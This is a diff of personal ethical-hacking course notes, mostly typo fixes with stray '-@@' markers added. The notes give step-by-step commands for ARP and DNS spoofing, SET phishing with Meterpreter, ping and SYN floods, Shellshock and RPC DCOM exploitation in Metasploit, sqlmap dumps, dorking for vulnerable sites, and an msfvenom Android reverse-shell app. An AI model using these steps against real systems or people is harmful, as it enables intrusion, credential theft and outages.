@@ -620,10 +620,10 @@ table updated and this way the attacker machine will be able to pretend as the R
 this attacker machine. -@@
 
 To verify the ARP spoofing and Poinsioning -> cmd -> arp -a // this will tell u the table for the earlier ARP request and
-reply and from here u can see the router MAC address
+reply and from here u can see the router MAC address -@@
 
-MITM Attack ->
-- Attacker machine 1 -> Start Cain, then go to sniffer, click '+' button, selct All 'tests' checkbox // the router IP is
+MITM Attack -> -@@
+- Attacker machine 1 -> Start Cain, then go to sniffer, click '+' button, select All 'tests' checkbox // the router IP is
 also needed as the MITM is going to between the victim machine and the router, So u need to know the gateway of the victim
 machine which is the gateway of the router
 - Attacker machine 1 -> In Cain go to APR, click '+', on the left side mention the victim machine IP and on the right side
@@ -631,16 +631,16 @@ mention the router IP or gateway IP, then start the APR, and once the traffic is
 router it will be intercepted here, Status here is 'Full Routing' then that means the traffic is going and comming back
 - Then go to the 'Password' traffic to see if the credentials were transfered in the traffic which would be have intercepted
 , and based on the services options such as FTP, IMAP u can intercept traffic.
-- U can also go to the VOIP option to intercept the traffic such as of skype.
+- U can also go to the VOIP option to intercept the traffic such as of skype. -@@
 
 Enable Routing -> Before starting any attack in kali linux u should do this setting changes as for the intercepting attacks
-u need to enable routing in kali, if this not then the traffic will stop at ur machine from the victim machine.
+u need to enable routing in kali, if this not then the traffic will stop at ur machine from the victim machine. -@@
 kali terminal -> cd /proc/sys/net/ipv4
-kali terminal -> nano ip_forward	// by default this file has setting as 0 so change it to 1
+kali terminal -> nano ip_forward	// by default this file has setting as 0 so change it to 1 -@@
 note -> check the value everytime u start the machine bcz may be it could change back to default value 0 once u shutdown the
-machine.
+machine. -@@
 
-MITM attack using Ettercap and Xplico -> This will not just intercept the packets but also change the content
+MITM attack using Ettercap and Xplico -@@-> This will not just intercept the packets but also change the content
 kali terminal -> ettercap -G // this is to intercept the traffic, this cmd will start the ettercap GUI and from their go to
 'Sniff' option and so on do the sniffing for the hosts and other settings to intercept the traffic, choose ARP poisioning
 kali terminal -> service apache2 start // this is needed to start Xplico
@@ -650,11 +650,11 @@ In xplico create new case now if u have some traffic that has been captured u ca
 , then create a new session in xplico, once the capturing of traffic is done stop it and then , now go to WEB option in 
 xplico and this will show the websites u searched, images, feed same u can do for the voip or email etc
 
-u can use website such as certifiedhacker.com fro testing purposes
+u can use website such as certifiedhacker.com for testing purposes
 
 DNS Spoofing ->
-It is like u replace the original IP of a domain with the attacker IP so that the user would we placed on attacker site.
-To spoof -> 
+It is like u replace the original IP of a domain with the attacker IP so that the user would we placed on attacker site. -@@
+To spoof ->  -@@
 kali terminal -> nano /etc/ettercap/etter.dns	
 then add a line their as -> *.target_website.com A attacker_ip
 kali terminal -> ettercap -T -q -M arp:remote -P dns_spoof	///  //this will implement this file to any traffic inside the 
@@ -664,24 +664,24 @@ on victim machine for windows ->ipconfig /release  	// this will get u new IP an
 													// done successful
 													
 Cyptography ->
-In malware analysis u will get to know that if u encrypt the virus u will be able to bypass the protection.
+In malware analysis u will get to know that if u encrypt the virus u will be able to bypass the protection. -@@
 'Cryptool' is a powerfull tool for practicing cryptography
-Cryptography r providing 2 different factor in security 
+Cryptography r providing 2 different factor in security  -@@
 - Confidentiality
 - Integreity
 
-U can use cryptool for encrypt and decrypt, the encrypted text is called cipher text 
-Caesar/ROT-13 algorithm is used by shifting the characters in text. this is symmetric encrypting.
+U can use cryptool for encrypt and decrypt, the encrypted text is called cipher text -@@ 
+Caesar/ROT-13 algorithm is used by shifting the characters in text. this is symmetric encrypting. -@@
 
-Logorithms r public and key is the secret part
+Logorithms r public and key is the secret part -@@
 If u see the key lens is 96 bit that mean the randomization of this key is 2**96, but remember greater the power lens the
-more processing will be needed.
+more processing will be needed. -@@
 
-Types of Cryptography -> Screenshot(53)
+Types of Cryptography -> Screenshot(53) -@@
 
-Symmetric encryption list -> Screenshot(54)
+Symmetric encryption list -> Screenshot(54) -@@
 
-Symmetric Encryption issue ->
+Symmetric Encryption issue -> -@@
 - Transportation as the cypher text and the key can't be send together bcz of the mail is compromised then it is not going
 be of any use as the attacker would get the key.
 - Number of keys -> Suppose if their r 4 people then each 2 people will need a seperate key, as suppose their r A, B, C so
@@ -690,27 +690,27 @@ the formaula to calculate it is n(n-1)/2 here the n is the no. of people.
 
 Asymmetric Encryption -> if a text is encrypted using the public key it can be decrypted only using ur private key, So if
 their r 10 people then their would be 10 private key and 10 public key.So private key is kept on the individual computers
-and the public keys would be available for everyone
-Asymmetric can be used for confidentiality and non-repudation.
+and the public keys would be available for everyone -@@
+Asymmetric can be used for confidentiality and non-repudation. -@@
 
-Here user A will ask for user B public key for confidentiality to encrypt data to send it from A to B,Screenshot(55)
+Here user A will ask for user B public key for confidentiality to encrypt data to send it from A to B,Screenshot(55) -@@
 https websites have certificates the green padlock symbol would be appearing on the address bar before the website address
 u can also see the details of a website certificates that what Encryption is used in 'Subject Public Key Algorithm' and
-also the Public key and when u open a website they actually sends u the public key. and what ever request u r doing it will
-be encryted using this site public key and it will be decrypted by using the site private kay which would be on their server
+also the Public key and when u open a website they actually sends u the public key, and what ever request u r doing it will
+be encryted using this site public key and it will be decrypted by using the site private kay which would be on their server -@@
 
 Asymmetric for Non-Repudation ->
 Now if we encrypt the msg using the private key and then it should be decrypted using the public key now their is no kind
 of confidentiality, but now the sender can't deny that he didn't send the msg as the private key is only available to the
-sender. and this is the digital signature.
+sender, and this is the digital signature. -@@
 
-Cryptography Hash ->
-Cyptography can also be use for integrity we can do it using tool Hash Calculator, Screenshot(56), which will gie u a value
+Cryptography Hash -> -@@
+Cyptography can also be use for integrity we can do it using tool Hash Calculator, Screenshot(56), which will give u a value
 of the file or data based of the type of Hash used(MD5, SHA1 etc) and this value could be used to verify the integrity of the
 file. Not all encryption protocols could be used for Hash. Same method is used for verifying the softwares that if they don't
 carry any type of malicious code.
 
-Stenography ->Screenshot(57)
+##Stenography ->Screenshot(57) -@@
 We can use tools like "invisiblesecrets" for the stenography, we can also do stenography manually.
 windows terminal -> copy/b	file_name_1.ext+file_name_2.ext file_name_3.ext	// /b means copy the binary, here we r hiding
 the file_name_2 inside file_name_1 and the new file is file_name_3, and the size of the file_name_3 would be the sum of
@@ -729,19 +729,19 @@ We can also hide one types of files in different types of files, means a pdf cou
 Stenography can be also used for metadata so on the hexa editor u can know the pic data of taken the camera and if the camera
 has the GPS I can know the location
 
-Cryptography Attack -> Offline attacks on the password were cryptographic attacks using cain.
-Suppose u have a hashed file in md5, now u can file online md5 decrypter websites which have huge wordlists to crack the hash
+Cryptography Attack -> Offline attacks on the password were cryptographic attacks using cain. -@@
+Suppose u have a hashed file in md5, now u can find online md5 decrypter websites which have huge wordlists to crack the hash -@@
 
-Social Engineering -> Screenshot(60)
+Social Engineering -> Screenshot(60) -@@
 Social Engineering Statics -> Screenshot(58)
 Social Engineering Module Flow -> Screenshot(59)
 
 Most of the times people trust emails blindly
 Go to website -> emkei.cz // to create a fake mail
-A spoofed mail using sites like above could go to the spam section of some mail providers.
+A spoofed mail using sites like above could go to the spam section of some mail providers.  -@@
 
-Phishing ->
-kali terminal -> setookit		// this is a social engineering tool
+Phishing -> 
+kali terminal -> setookit		// this is a social engineering tool -@@
 > 2 // this is the option no. for fast-track, this option will scan the system look for vulnerability then hack the 
 	// vulnerability and then give u access rigth but before using this tool u should update the social-engineering toolkit
 	// and update the set the configurations
@@ -755,25 +755,25 @@ kali terminal -> setookit		// this is a social engineering tool
 // would got open on the victim machine and once victim enter his credentials it would be sent to attacker and once u
 // sign in u would be get directed to real twitter.
 
-U can use the website -> bit.ly it will mask the URL to another URL or mask the IP to a URL. 
+U can use the website -> bit.ly it will mask the URL to another URL or mask the IP to a URL. -@@
 
-Most of the times people uses the same passwords for their all accounts.
+Most of the times people uses the same passwords for their all accounts.  
 
-Vishing attack using Fake calls ->  phonecalls and text msgs can be spoofed
-u can use the website such as -> spoofcard.com, it also gives the option to change ur voice
+Vishing attack using Fake calls ->  phonecalls and text msgs can be spoofed -@@
+u can use the website such as -> spoofcard.com, it also gives the option to change ur voice -@@
 
 Countermeasures -> use 2 factor authentication for more security and get prevented form the social attacks, and if someone
 is calling u or pretending to be from the technical support the better way to validate that is u hangup the call and call
-that individual back and also do teh same for the mail and sms if someone send u a mail or sms reply back and ask u that
-individual has sent u that mail or sms.
+that individual back and also do the same for the mail and sms if someone send u a mail or sms reply back and ask u that
+individual has sent u that mail or sms. -@@
 
 Other Social engineering attacks ->
 - In this one the phishing attack is done and once the victim will open the website the payload would be installed on the
 victim's computer and the attacker will get the access of the victims machine, this attack depends on the OS of the victim
 machine, it depends on the anti-virus on the victim machine, broswers the victim is using etc hence u might have to try this
-attack more then one time
+attack more then one time -@@
  
-Phishing ->
+Phishing -> -@@
 kali terminal -> setookit		
 > 2
 > 1 
@@ -787,70 +787,61 @@ kali terminal -> setookit
 > 1	// the type of payload 'Meterpreter'
 // now the attacker will wait for the connection to be established
 
-
 Firewall in the organizations mostly prevent to have a connection to the machine from the outside hence it is much better
-to get the connection from the inside of the organization from the victim machine.
+to get the connection from the inside of the organization from the victim machine. -@@
 
-Most of the times people gets the common msgs like update the java or download the java.
+Most of the times people gets the common msgs like update the java or download the java. -@@
 
-Denial of Service -> Screenshot(68) DoS affects the availability of the victim
-Types of DoS Attacks ->
-- Volumetric Attack - Screenshot(61), This attack depends on loading the server
+Denial of Service -> Screenshot(68) -@@, DoS affects the availability of the victim
+Types of DoS Attacks -> -@@
+- Volumetric Attack - Screenshot(61), This attack depends on loading the server 
 cmd -> ping ip_of_the_victim_server -t -l 65000 // -l is for the size of the packet and here we r sending the 65000 bytes of 
 // ICMP packet size and the -t will get the packets to be send continously untill the attacker stops it .
 // U will also see that if u do ping with the above syntax on yahoo or google they will this time not send the reply back
 // as they will figure out that u r trying to overload the server.
-
 - TCP state - Screenshot(62), Here in the 3 way handshake to the server the attacker will not send the ACK flag back to the
 server this way the connection would remain in pending state and the attacker will sned another SYN for another request for
 connection establishment and the attacker will keep doing that untill the server is overloaded and all the resources have
 been used and the normal user when sends the normal connection establishment request he will not get his connection 
 established bcz their is now no slot left on the server.
-
 - UDP Attack - Screenshot(63), In this u send the huge amount of UDP traffic and wait untill the server crash
-
-- Fragmentation attack - Screenshot(64), Sometimes the information is large it will ve divided to different packet and once
-the reiever started taking the packets it will wait for the next fragmented packet, this is done by manupulating the header
+- Fragmentation attack - Screenshot(64), Sometimes the information is large it will be divided to different packet and once
+the reciever started taking the packets it will wait for the next fragmented packet, this is done by manupulating the header
 of the packet so it will crash the server
-
 - Application layer attack - Screenshot(66), It uses a program which will create a high volume of accounts which will crash
 the server or u can send a huge amount of http requests to the application untill the application crash
-
 - DNS attack - Screenshot(67), Here u will send a huge amount of DNS requests to resolve the IP in short time of interval
 that may lead to crash DNS server. 
-
 Ex -> windows victim terminal -> start the http server on this machine so it could act like server, once the server is 
 installed and the attacker side browser enter the victims IP in address bar he will see that the IIS server is started on
-the windows machine.
+the windows machine. -@@
 - on attacker machine -> download from the sourceforge.net as it is a trusted provider the tool loic, on the tool enter
-the required details of victim, choose HTTP attack
+the required details of victim, choose HTTP attack -@@
 Note -> doing it from one computer will not crash the Server but it will definately affect it.
-- Now of u go to the victims task manager, u will see that IIS server process CPU utilization is very high and increasing.
-- Most of the website r hosted on Linux web server machine.
-
-SYN Flood attack -> Screenshot(69), this will crash the rotuer, but once u restart the router it will be working fine, for
+	- Now of u go to the victims task manager, u will see that IIS server process CPU utilization is very high and increasing.
+	- Most of the website r hosted on Linux web server machine. -@@
+-SYN Flood attack -> Screenshot(69), this will crash the rotuer, but once u restart the router it will be working fine, for
 this attack we will use the tool hping3 // this tool might take more time to execute the whole attack
-use the Gtrack vm as the vimtim here // it is better for the service starting.
+use the Gtrack vm as the victim here // it is better for the service starting.
 kali terminal -> hping3 -i u100	-S -p 80 victim_ip // u is the time interval between the each request sent to victim server
 // -S is for the SYN packet, -p is for port here it is 80 
 // generaly the attacker do not send the SYN packet or this attack from their own machine or use proxy server
-
-SYN Flood attack using different tool -> This tool 'Pyloris' is more effective for the Linux server based websites, enter
+-SYN Flood attack using different tool -> This tool 'Pyloris' is more effective for the Linux server based websites, enter
 the required data of the victim in the tool and after some attempts it will crash the linux server.
 
 Distributed Denial of Service -> Screenshot(70), For DoS their r counter measures which u can take for the DDoS their is
-nothing u can do.
+nothing u can do. -@@
 
-Hacking Web Server -> Screenshot(71)
+Hacking Web Server -> Screenshot(71) -@@
 Few years back their was this one vulnerability found on Apache called shell shock and bcz of that many computers were
-compromised, Windows server 2003 and windows r very vulnerable OS, Web server Microsoft IIS 6 is also very vulnerable.
+compromised, Windows server 2003 and windows r very vulnerable OS, Web server Microsoft IIS 6 is also very vulnerable. -@@
 
-If u found a site with web server OS as Apache u can use Shellshock VM to exploit it
+If u found a site with web server OS as Apache u can use Shellshock VM to exploit it -@@
 after installing it in VM do this from the attacker browser -> sheelshock_vm_ip/cgi-bin/status // and if u r getting the date
-and time, actually this was the vulnerable function inside the system and u can try to hack now using this vulnerability. 
+and time, actually this was the vulnerable function inside the system and u can try to hack now using this vulnerability.  -@@
 
 kali terminal -> service postgresql start // whenever u start metasploit u need to start this service first
-kali terminal -> msfconsole
+kali terminal -> msfconsole -@@
 > use exploit/multi/http/apache_mod_cgi_bash_env_exec	// we r now going to specific vulnerability
 > show options
 > set LHOST	attacker_ip // this is where reverse connection is done
@@ -863,26 +854,26 @@ kali terminal -> msfconsole
 - If the OS is all patched and secure(which is almost impossible then try to look for the vulnerable services)
 
 Hacking a Windows Server ->
-kali terminal -> msfconsole
+kali terminal -> msfconsole -@@
 > search rpc dcom	// the metasploit will search in it's database for keyword rpc and dcom or use CVE no. instead
 > use path_for_the_vulnerability_in_metasploit_given_by_above_cmd
 > show options
 > exploit
 
 - Previously u need to know certain Programming launguages to use CVE's but metasploit elimate the need to know the language
-as it will do that work for the attacker the, attacker know just only need to know the CVE
+as it will do that work for the attacker , the attacker know just only need to know the CVE -@@
 
-- Armitage is the graphical view for the Metasploit framework, do these two cmds before executing Armitage 
+- Armitage is the graphical view for the Metasploit framework, do these two cmds before executing Armitage -@@ 
 kali terminal -> start postgresql service
 kali terminal -> msfdb init
 
-- We do not enter the specific CVE in metasploit as we can ask metasploit to find the vulnerabilities on machine for us.
+- We do not enter the specific CVE in metasploit as we can ask metasploit to find the vulnerabilities on machine for us. -@@
 
 - SQL Injection from Zaid Pentesting 
 
 - Try OWASP bricks website for practice and use other websites too for practice.
 
-- 'vega' is a web application vulnerability scanning tool but not exploit and if their is sql injection possible inside
+- 'vega' is a web application vulnerability scanning tool but not exploit and if their is sql injection possible inside -@@
 the web app it will give u the possible link, we can use  the sqlmap to exploit the links as
 kali terminal -> sqlmap -u url_of_sqli --dbs	// --dbs will make it to try to get the all database info
 kali terminal -> sqlmap -u url_of_sqli --dbms='DB_name'	--users // to get the users list and so on u can use other flags
@@ -891,26 +882,26 @@ infected URL, level is from 1 to 5
 
 - To search for a injected websites via google ->
 - search this on google -> google dorksfor sql injection // this way u will get a list of infected website, u will also get
-the list of google operators to search for vulnerable websites
+the list of google operators to search for vulnerable websites -@@
 
-Risk Assessment -> Screenshot(72), Screenshot(73)
-Risk is Buissness terminology
+Risk Assessment -> Screenshot(72), Screenshot(73) -@@
+Risk is Buissness terminology -@@
 
-Risk Management Principals -> Screenshot(74)
+Risk Management Principals -> Screenshot(74)  -@@
 Mitigation -> ?
 
-Information Asset Register -> Screenshot(75)
+Information Asset Register -> Screenshot(75) -@@
 
 Policy and Procedure -> Sans.org provides lots of security policy for various fields.
 
-Security in Layers -> Screenshot(76)
+Security in Layers -> Screenshot(76) -@@
 
 Mobile Hacking ->
-Anatomy of Mobile Attack -> Screenshot(77)
+Anatomy of Mobile Attack -> Screenshot(77) -@@
 
-For Virtualization of Mobile us can use Bluestacks or mobizen but the better way would be to use a real device
+For Virtualization of Mobile us can use Bluestacks or mobizen but the better way would be to use a real device -@@
 
-Phase 1 ->
+Phase 1 -> -@@
 Creating a Malicious mobile App -> Once the Victim install this App he will be able to get access of the victim machine
 - Many poeple do not consider to install anit virus on their mobile or tablets
 - U need to have bridged network of virtualbox to simulate this attack
@@ -918,7 +909,7 @@ kali terminal -> msfvenom -p android/meterpreter/reverse_tcp LHOST attacker_ip L
 443 is https service port so if someone finds out that this device is connected to another one he will not suspect it as 
 malacious bcz the 443 is regular service in usage which HTTPS port.
  
-Phase 2 -> 
+Phase 2 -> -@@
 Copy the App at victim mobile ->
 - Keep the app in ur home folder of attacker, bcz keeping it in home folder will make it hard to be detected 
 - once the malicious app is copied to the victim's phone
@@ -932,7 +923,7 @@ kali terminal -> msfconsole
 > exploit 
 
 Stagefright Attack -> It is one of the most famous exploit in android devices.
-kali terminal -> msfconsole
+kali terminal -> msfconsole -@@
 > search stagefright	// stagefright can do different kinds of attacks such as creating an mp4 file which could be used to
 // get the reverse connection
 > use path_for_the_vulnerability_in_metasploit_given_by_above_cmd
